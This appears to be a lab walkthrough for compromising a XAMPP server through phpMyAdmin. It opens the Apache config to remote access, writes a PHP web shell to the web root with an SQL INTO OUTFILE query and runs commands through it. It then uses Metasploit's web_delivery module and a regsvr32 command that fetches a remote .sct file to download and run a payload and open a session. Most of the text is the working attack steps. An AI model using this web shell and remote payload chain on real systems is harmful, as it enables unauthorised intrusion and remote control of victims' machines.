PhpMyAdmin is a free software tool written in PHP, intended to handle the administration of MySQL over the Web. phpMyAdmin supports a wide 
range of operations on MySQL and MariaDB. Frequently used operations (managing databases, tables, columns, relations, indexes, users, 
permissions, etc) can be performed via the user interface, while you still have the ability to directly execute any SQL statement.

Prepering VM. First we have to change our config file C:\xampp\apache\conf\extra\httpd-xampp.conf and allow to remote user access our 
PHP admin panel. In order to enable it we need to add "allow from 10.0.2.26" and:

<Directory "C:/xampp/">
    AllowOverride AuthConfig Limit
    Order allow,deny
    Allow from all
    Require all granted
</Directory>

After this our server is ready to be compromised.

1. Go to main XAMP page,
2. Go to phpMyAdmin,
3. Create new databse,
4. Execute SQL Query: SELECT “<?php system($_GET[‘cmd’]); ?>” into outfile “C:\\xampp\\htdocs\\backdoor.php” !!Remeber to chane "'" sings
to the new one. Because of different encoding it can cause error.
5. Now we created a new php file in main directory where HTTP resources are stored.
6. Like we can see "http://10.0.2.10/backdoor.php" exist, now we can interact with victim machine.
7. http://10.0.2.10/backdoor.php?cmd=dir will list the content of directory where PHP shell is stored.
8. Now run MSFCONSOLE.
9. We need to USE module exploits/multi/script/web_delivery.rb

IMPORTANT ! exploit/windows/misc/regsvr32_applocker_bypass_server is no longer valid. !

10. During configuration options remeber to change target:

msf exploit(multi/script/web_delivery) > show targets 
Exploit targets:

   Id  Name
   --  ----
   0   Python
   1   PHP
   2   PSH
   3   Regsvr32
   4   PSH (Binary)

11. Execute command regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll using our PHP shell. Session is created.

The module creates a web server that hosts an .sct file. When the user types the provided regsvr32 command on a system, 
regsvr32 will request the .sct file and then execute the included PowerShell command. This command then downloads and executes the 
specified payload (similar to the web_delivery module with PSH). Both web requests (i.e., the .sct file and PowerShell download 
and execute) can occur on the same port.
  
https://www.rapid7.com/db/modules/auxiliary/server/regsvr32_command_delivery_server
   
IN computing, regsvr32 (Microsoft Register Server) is a command-line utility in Microsoft Windows operating systems for registering and 
unregistering DLLs and ActiveX controls in the Windows Registry. To be used with regsvr32, a DLL must export the functions
DllRegisterServer and DllUnregisterServer. regsvr32 in Windows is comparable to ldconfig in Linux.

Regsvr32 to narzędzie wiersza polecenia służące do rejestrowania i wyrejestrowywania kontrolek OLE, takich jak kontrolki bibliotek DLL 
i kontrolki ActiveX, w rejestrze systemu Windows Registry.
